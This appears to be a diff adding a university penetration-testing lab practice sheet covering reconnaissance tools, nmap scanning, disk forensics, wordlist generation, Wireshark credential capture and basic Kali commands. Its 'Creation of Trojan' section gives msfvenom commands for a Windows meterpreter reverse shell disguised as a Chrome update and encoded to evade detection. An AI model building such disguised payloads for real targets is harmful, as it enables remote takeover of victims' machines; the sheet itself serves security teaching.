@@ -1,0 +1,175 @@
+VAPT Consolidated Practice Sheet
+1.Whois:
+•	Open terminal in Kali Linux and run ‘whois google.com’
+•	If it is not pre- installed: sudo apt update
+o	sudo apt update
+o	sudo apt install whois –y
+•	Sample Output You Should Observe: Registrar Information, Domain Creation & Expiry Dates, Domain Status (active, clientTransferProhibited, etc.), Name Servers, Registrant Organization
+
+2.DIG
+•	Open terminal in Kali Linux and run:
+o	dig google.com
+•	Get IP Address
+o	dig example.com A
+•	Get Mail Servers
+o	dig example.com MX
+•	If DIG is Not Installed
+o	sudo apt update
+o	sudo apt install dnsutils –y
+3.theHarvester
+•	Open terminal in Kali Linux and execute:
+o	theHarvester -d google.com -l 100 -b google
+•	theHarvester collects OSINT (Open Source Intelligence) such as: Email addresses related to domain, Subdomains, Hostnames, IP addresses, Employee/usernames
+•	If theHarvester is Not Installed
+o	sudo apt update
+o	sudo apt install theharvester –y
+•	You can also access or clone from:
+o	GitHub: https://github.com/laramies/theHarvester	
+4. testphp.vulnweb.com is an intentionally vulnerable and publicly accessible web application provided for security education and testing purposes. The problem is to perform passive reconnaissance on the given website using standard OSINT tools such as WHOIS, NSLOOKUP, DIG, theHarvester  in order to collect publicly available domain, DNS, email, and service-related information, analyze the potential security risks associated with the exposed information, and recommend suitable defensive measures to minimize information leakage—without performing any active scanning or exploitation.
+
+
+5.Google Dorking:
+•	Open any browser (in Kali Linux or Windows) and use Google search:
+o	site:testphp.vulnweb.com
+•	Search for any given file type on given website:
+o	E.g. site:ves.ac.in ext:doc
+o	site:example.com ext:sql
+o	site:example.com inurl:admin
+6.Nmap
+•	Identify the target IP address or network range using ‘ping’ command
+•	Ping scan: Discover active hosts on the target network: nmap -sn <target_network>
+•	SYN scan: Identify open TCP ports using the full TCP handshake: nmap -sT <target_IP>
+•	Stealth SYN Scan : Sends SYN packets without completing the handshake: nmap -sS <target_IP>
+•	UDP Scan : Detects open UDP services : nmap -sU <target_IP>
+•	Service Version Detection : Identifies software and version numbers running on open ports: nmap -
+•	sV <target_IP>
+•	Operating System Detection : Attempts to identify the OS using TCP/IP fingerprinting : nmap –O <target_IP>
+7.Angry IP Scanner: (Already installed)
+•	Enter the target IP address range
+•	Select scan methods: ICMP (Ping) /TCP ports
+•	Choose suggested ports such as: 21 (FTP) /22 (SSH) /80 (HTTP) /443 (HTTPS)
+•	Click the Start button to initiate scanning
+•	For each detected host, observe: IP address, Hostname, MAC address, Open ports, Response time
+•	Export scan results in formats such as: CSV /TXT /XML
+8.FTK Imager
+•	Launch FTK Imager
+•	Create Disk Image: File → Create Disk Image (Source Type : Image File) →click Next (Use given image)
+•	Select Image Format: E01 (Recommended)
+•	Select Destination: Choose Output Folder → Verify images after they are created
+•	Observe acquisition details
+•	Observing Hash Values
+•	Observing File Metadata
+
+9.Autopsy
+•	Launch Autopsy (Run as Administrator).
+•	Create New Case
+•	Select type of Data source to add, Select Disk Image, Browse and select E01 image
+•	Enable : File Type Identification, Keyword Search, Hash Lookup, Web Artifacts,  Email Parser, Recent Activity, Timeline and click finish
+•	Image created
+•	Observer artifacts:
+o	Deleted Files
+o	Observer timeline analysis
+o	Generate report
+10.Crunch
+•	Install Crunch
+o	sudo apt update
+o	sudo apt install crunch
+•	. To generate a wordlist with a minimum and maximum length, use the following syntax:
+o	crunch <min_length> <max_length> -o <output_file> 
+o	crunch 6 8 -o wordlist.txt -t ABC123
+11.Capturing the credentials using http (unsecured website) and https (secured website) using wireshark
+o	Open the wireshark, start capture
+o	Browse any http website, provide fake login details then stop capturing in wireshark
+o	Check for http packet and capture credentials
+o	Open the wireshark, start capture
+o	Browse any https website, provide fake login details then stop capturing in wireshark
+o	Check for http packet and capture encrypted credentials
+12.Creation of Trojan
+o	Note down Attacker IP address and Target IP address
+o	Install Metasploit (if not installed) using command – ‘snap install metasploit-framework’
+o	Initialize database- msfdb init
+o	Launch Metasploit Console- msfconsole
+o	Check database connection-  db_status
+o	Search Windows-based payloads-  search platform:windows
+o	Identify attacker ID (ifconfig) and Generate Payload- e.g. ‘ msfvenom --payload windows/meterpreter/reverse_tcp \ --arch x86 --format exe \ LHOST=192.168.0.28 LPORT=4444 > windowsMeterpreter.exe’ [LHost – Attacker IP, Lport- Listening port]
+o	Payload can be embedded inside legitimate-looking executable- 
+This disguises payload as a trusted application. 
+“msfvenom --payload windows/meterpreter/reverse_tcp \
+--template /home/Downloads/ChromeUpdate.exe \
+--arch x86 --format exe \
+--encoding x86/shikata_ga_nai --iterations 500 \
+LHOST=10.0.2.15 LPORT=4444 > windowsMeterpreter.exe”
+
+
+
+Pre- requisite commands for Kali Linux (if need practice):
+Basic Kali Linux Commands for Cyber Security Lab
+This document contains essential Linux commands that students should practice before performing cybersecurity experiments such as WHOIS, DIG, theHarvester, and Google Dorking. These commands help in navigating the system, managing files, installing tools, and performing basic network operations in Kali Linux.
+1. Basic Navigation Commands
+Command	Description
+pwd	Displays current working directory
+ls	Lists files and directories
+cd foldername	Change directory
+cd ..	Move to parent directory
+clear	Clear terminal screen
+
+2. File and Directory Management
+Command	Description
+mkdir foldername	Create new directory
+rmdir foldername	Remove empty directory
+rm filename	Delete file
+cp source destination	Copy files
+mv source destination	Move or rename files
+________________________________________
+3. System Information Commands
+Command	Description
+whoami	Display current user
+ifconfig	Display network interfaces
+ip a	Show IP address details
+uname -a	Display system information
+top	Show running processes
+
+4. Package Management Commands
+Command	Description
+sudo apt update	Update package list
+sudo apt upgrade	Upgrade installed packages
+sudo apt install packagename	Install new package
+sudo apt remove packagename	Remove package
+
+5. Networking Commands
+Command	Description
+ping google.com	Check network connectivity
+netstat -tulnp	Show active network connections
+ss -tuln	Display listening ports
+traceroute google.com	Trace route to destination
+
+6. File Viewing Commands
+Command	Description
+cat filename	Display file content
+less filename	View file page by page
+head filename	Show first few lines
+tail filename	Show last few lines
+
+7. Permissions and Ownership
+Command	Description
+chmod 777 filename	Change file permissions
+chown user:group filename	Change ownership
+
+8. Useful Keyboard Shortcuts
+Shortcut	Function
+Ctrl + C	Stop running command
+Ctrl + Z	Pause process
+Tab	Auto-complete command
+↑ / ↓	Navigate command history
+
+9. Pre-Requisite Practice Commands (For Lab Readiness)
+sudo apt update
+sudo apt install whois dnsutils theharvester -y
+
+whois example.com
+dig example.com
+theHarvester -d example.com -b google
+
+ping google.com
+ip a
+
